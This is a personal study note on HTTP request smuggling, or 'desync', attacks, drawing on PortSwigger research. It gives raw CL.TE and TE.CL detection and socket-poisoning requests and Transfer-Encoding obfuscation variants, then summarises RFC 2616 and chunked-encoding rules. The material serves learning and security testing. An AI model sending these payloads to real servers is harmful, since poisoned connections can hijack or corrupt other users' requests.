---
title: HTTP Resync
author: i4
date: M11-02-2022
---
# HTTP Resync
[Portswigger](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)

## Frontend doesn't support chunked

```
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: example.com
```

## Frontend support chunked but backend doesn't

```
POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

6
PREFIX
0

Post / HTTP/1.1
Host: example.com
```

## Different Transfer-Encoding masking
`Transfer-Encoding: xchunked`
`Transfer-Encoding: chunked`
`Transfer-Encoding: \tchunked`
`Transfer-Encoding: chunked`
`Transfer-Encoding: chunked`
`X: X[\n]Transfer-Encoding: chunked`
`Transfer-Encoding\n: chunked`

## Detecting HTTP Resync

```
								       +=================+
+===============+      +===============+       +==============+        |                 |
|               |      |               |       |              |        |  Store          |
|  Detect       |======|    Confirm    |=======| Explore      |========+=================+
|               |      |               |       |              |        |                 |
+===============+      +===============+       +==============+        |  Attack         |
                                                                       +=================+
```

## CL.TE Content-Length / Transfer-Encoding

If the following request gets processed by the front-end server it will only forward until the `Z` character due to the low `Content-Length` value.
The backend will time out while waiting for the next chunk size. This will cause an observable time delay.

If both server are in sync (TE.TE or CL.CL) the request will either be rejected by the front-end or harmlessly processed by both systems.
Finally , if the desync occurs the other way around (TE.CL) the front-end will reject the massage without ever forwarding it to the back-end, thanks to the invalid chunk size `Q`.
This prevents the back-end socket from being poisoned.

```
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1\r\n
Z\r\n
Q
```

We can also safely detect TE.CL desync using the following request:
```
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0                    # chunk size indicator

X
```
Thanks to the terminating '0' chunk, the front-end will only forward the blue text and the back-end will time out waiting for the X to arrive.
If the desync happens the other way around (CL.TE) then this approach will poison the back-end socket with an X, potentially harming legitimate users. ##RUN THE OTHER REQUEST FIRST!##
### Confirm
Requests need to be similar as possible.

#### CL.TE poisoning
```
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: zchunked

17
=x&q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: bPOST /search HTTP/1.1
Host: example.com
...
```

#### TE.CL poisoning
```
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: zchunked

96
GET /404 HTTP/1.1
X: x=1&q=smuggling&x=
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

x=
0

POST /search HTTP/1.1
Host: example.com
...
```


# Request smuggling .......

If the client sends the following request:

```
POST / HTTP/1.1\r\n
HOST: example.com\r\n
Content-Length: 6\r\n
Content-Lenght: 5\r\n
\r\n
12345GPOST / HTTP/1.1\r\n
Host: example.com
...
```

The frontend forwards everything to the backend who might in turn just interprets just the `Content-Length: 6` header which leaves the backend poisoned.
This attack rarely works.

# RFC2616
> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.

## Content-Lenght header
`Content-Length: <length(dec)>`
#### Directives
##### Length
The length in decimal number of octets including \r\n

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 6
\r\n                    # Indicates start of body
0\r\n                   # \r\n will also be counted
\r\n
A
```

## Transfer-Encoding
// not available in HTTP/2

> Transfer-Encoding is a hop-by-hop header that is applied to a message between two nodes, not to a resource itself.
> When present on a response to a HEAD request hat has no body, it indicates the value that would have applied to the corresponding GET message.

#### Directives
##### chunked
The Content-Length header is omitted in this case and the beginning of each chunk you need to add the length of the current chunk in hexadecimal format
followed by `\r\n` and then the chunk itself, followed by another `\r\n`. The terminating chunk is a regular chunk, with the exception that its length is zero. It is followed by the trailer, which consists of a (possibly empty) sequence of header fields

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Transfer-Encoding: chunked

4\r\n
TEST\r\n
7\r\n
CHUNKED\r\n
0\r\n
\r\n
```

##### compress
A format using the Lempel-Ziv-Welch (LZW) algorithm. The value name was taken from the UNIX compress program, which implemented this algorithm.
Like the compress program, which has disappeared from most UNIX distributions, this content-encoding is used by almost no browsers today, partly because of a patent issue

##### deflate
Using the zlib structure (RFC 1950), with the deflate compression algorithm.

##### gzip
A format using the Lempel-Ziv coding, with 32-bit CRC. This is originally the format of the UNIX gzip tool. The HTTP/1.1 standard also recommends that the servers supporting this content-encoding should recognize x-gzip as an alias.
##### identity
//TODO READ more about it
Indicates the identity function. This token, except if explicitly specified, is always deemed acceptable.

